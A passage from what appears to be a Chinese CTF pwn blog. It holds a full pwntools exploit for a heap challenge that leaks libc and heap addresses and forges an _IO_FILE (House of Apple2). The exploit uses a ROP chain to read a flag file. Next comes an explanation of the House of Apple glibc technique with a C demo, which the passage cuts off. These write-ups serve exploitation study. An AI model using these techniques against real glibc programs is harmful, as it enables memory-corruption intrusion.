class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./oneday1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1B0A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">i</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">mod</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choise: &quot;</span>,<span class="built_in">str</span>(mod))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,message</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Message: \n&quot;</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your key &gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>) </span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>) </span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Message: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x1810</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1f2cc0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">magic_gadget = libc_base + libc.sym[<span class="string">&#x27;svcudp_reply&#x27;</span>] + <span class="number">26</span></span><br><span class="line">success(<span class="string">&quot;_IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">success(<span class="string">&quot;magic_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(magic_gadget))</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000000446c0</span> + libc_base</span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000002daa2</span> + libc_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000037c0a</span> + libc_base</span><br><span class="line">pop_rdx_rbx_ret = <span class="number">0x0000000000087729</span> + libc_base</span><br><span class="line">syscall_ret = <span class="number">0x00000000000883b6</span> + libc_base</span><br><span class="line">leave_ret = <span class="number">0x0000000000052d72</span> + libc_base</span><br><span class="line">ret = <span class="number">0x000000000002d446</span> + libc_base</span><br><span class="line">add_rsp_ret = <span class="number">0x0000000000103936</span> + libc_base</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">add(<span class="number">2</span>) </span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x22d0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x2540</span></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x2540</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">0x8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">shellcode += p64(add_rsp_ret)</span><br><span class="line">shellcode =  shellcode.ljust(<span class="number">0x18</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode += p64(shellcode_addr)</span><br><span class="line">shellcode =  shellcode.ljust(<span class="number">0x28</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode += p64(leave_ret)</span><br><span class="line">shellcode += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line"><span class="comment"># open(heap_addr,0)</span></span><br><span class="line">shellcode += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">shellcode += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">shellcode += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(pop_rdx_rbx_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,heap_addr,0x60)</span></span><br><span class="line">shellcode += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">shellcode += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">shellcode += p64(pop_rdx_rbx_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,heap_addr,0x60)</span></span><br><span class="line">shellcode += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">shellcode += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">shellcode += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">shellcode += p64(pop_rdx_rbx_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">shellcode += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">chunkA = <span class="string">&quot;chunka&quot;</span> <span class="comment"># fake_io_addr+0xe0</span></span><br><span class="line">chunkA =  chunkA.ljust(<span class="number">0xe0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">chunkA += p64(fake_io_addr+<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">chunkB = <span class="string">&quot;chunkb&quot;</span> <span class="comment"># fake_io_addr+0x200</span></span><br><span class="line">chunkB = chunkB.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">chunkB += p64(magic_gadget)</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  p64(<span class="number">0</span>)    <span class="comment">#_flags=0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xab1</span>-<span class="number">0x30</span>) </span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x48</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(shellcode_addr)</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x1f5720</span>)  <span class="comment"># _lock</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xe0</span>)<span class="comment"># _wide_data</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable=IO_wfile_jumps</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xe0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += chunkA</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += chunkB</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(heap_base)+p64(_IO_list_all-<span class="number">0x20</span>)</span><br><span class="line">payload += fake_IO_FILE</span><br><span class="line">payload += shellcode</span><br><span class="line">payload = payload.ljust(<span class="number">10</span>*<span class="number">0x110</span>-<span class="number">0x10</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xab1</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">choice(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>本题目我花了很长的时间，从堆风水的搭建，到 <code>_IO_FILE</code> 的伪造，再到控制程序流，这些步骤都不好完成</p>
<p>但 House Of Apple2 的确很好用，常常需要 <code>libc.sym[&#39;svcudp_reply&#39;]+26</code> 来劫持控制流</p>
<p>而 House Of Apple 则可以利用一次 largebin attack 来同时写入多个已知数据</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/08/House%20Of%20Apple-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Apple-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-08 23:41:08" itemprop="dateCreated datePublished" datetime="2022-11-08T23:41:08+08:00">2022-11-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-10 02:29:00" itemprop="dateModified" datetime="2022-11-10T02:29:00+08:00">2022-11-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Apple"><a href="#House-Of-Apple" class="headerlink" title="House Of Apple"></a>House Of Apple</h2><p>House Of Apple 可以在仅使用一次 largebin attack 并限制读写次数的条件下进行 FSOP 利用</p>
<p>此方法利用成功的前提是已经泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </p>
<hr>
<h2 id="House-Of-Apple-原理"><a href="#House-Of-Apple-原理" class="headerlink" title="House Of Apple 原理"></a>House Of Apple 原理</h2><p>当程序从 <code>main</code> 函数返回或者执行 <code>exit</code> 函数的时候，均会调用 <code>fcloseall</code> 函数，该调用链为： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wstrn_overflow</span><br></pre></td></tr></table></figure>
<ul>
<li>最后会遍历 <code>_IO_list_all</code> 存放的每一个 <code>IO_FILE</code> 结构体</li>
<li>如果满足条件的话，会调用每个结构体中 <code>vtable-&gt;_overflow</code> 函数指针指向的函数</li>
</ul>
<p>使用 largebin attack 可以劫持 <code>_IO_list_all</code> 变量，将其替换为伪造的 <code>IO_FILE</code> 结构体，而在此时，我们其实仍可以继续利用某些IO流函数去修改其他地方的值</p>
<p>要想修改其他地方的值，就离不开 <code>_IO_FILE</code> 的一个成员 <code>_wide_data</code> 的利用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">amd64：</span><br><span class="line"></span><br><span class="line"><span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line"><span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line"><span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line"><span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line"><span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line"><span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line"><span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line"><span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line"><span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line"><span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line"><span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line"><span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line"><span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line"><span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line"><span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br></pre></td></tr></table></figure>
<p>我们在伪造 <code>_IO_FILE</code> 结构体的时候，伪造 <code>_wide_data</code> 变量，然后通过某些函数，比如 <code>_IO_wstrn_overflow</code> 就可以将已知地址空间上的某些值修改为一个已知值</p>
<h2 id="House-Of-Apple-利用姿势"><a href="#House-Of-Apple-利用姿势" class="headerlink" title="House Of Apple 利用姿势"></a>House Of Apple 利用姿势</h2><p>使用 house of apple 的条件为：</p>
<ul>
<li>程序从 <code>main</code> 函数返回或能调用 <code>exit</code> 函数</li>
<li>能泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </li>
<li>能使用一次 largebin attack（一次即可） </li>
</ul>
<p>先利用 largebin attack 劫持 <code>_IO_list_all</code>，然后伪造一个 <code>stderr IO_FILE</code>：</p>
<ul>
<li>stderr+0x28 = -1（stderr-&gt;_IO_write_ptr）</li>
<li>stderr+0x74 = 8（stderr-&gt;_flags2）</li>
<li>stderr+0xa0 = target（stderr-&gt;_wide_data）</li>
<li>stderr+0xd8 == _IO_wstrn_jumps（stderr-&gt;vtable）</li>
</ul>
<p>最后调用 exit 完成修改（因为 <code>stderr IO_FILE</code> 被伪造，因此程序不会真的退出）</p>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="keyword">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> puts_addr = (<span class="keyword">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="keyword">void</span> *)puts_addr);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">stderr</span> = puts_addr + <span class="number">0x1691a0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> stderr_write_ptr_addr = <span class="built_in">stderr</span> + <span class="number">0x28</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_write_ptr_addr);</span><br><span class="line">    <span class="keyword">size_t</span> stderr_flags2_addr = <span class="built_in">stderr</span> + <span class="number">0x74</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_flags2_addr);</span><br><span class="line">    <span class="keyword">size_t</span> stderr_wide_data_addr = <span class="built_in">stderr</span> + <span class="number">0xa0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="keyword">void</span> *)stderr_wide_data_addr);</span><br><span class="line">    <span class="keyword">size_t</span> sdterr_vtable_addr = <span class="built_in">stderr</span> + <span class="number">0xd8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="keyword">void</span> *)sdterr_vtable_addr);</span><br><span class="line">    <span class="keyword">size_t</span> _IO_wstrn_jumps_addr = <span class="built_in">stderr</span> - <span class="number">0x4960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_write_ptr_addr = (<span class="keyword">size_t</span>)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr_wide_data_addr = (<span class="keyword">size_t</span>)p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)sdterr_vtable_addr = (<span class="keyword">size_t</span>)_IO_wstrn_jumps_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    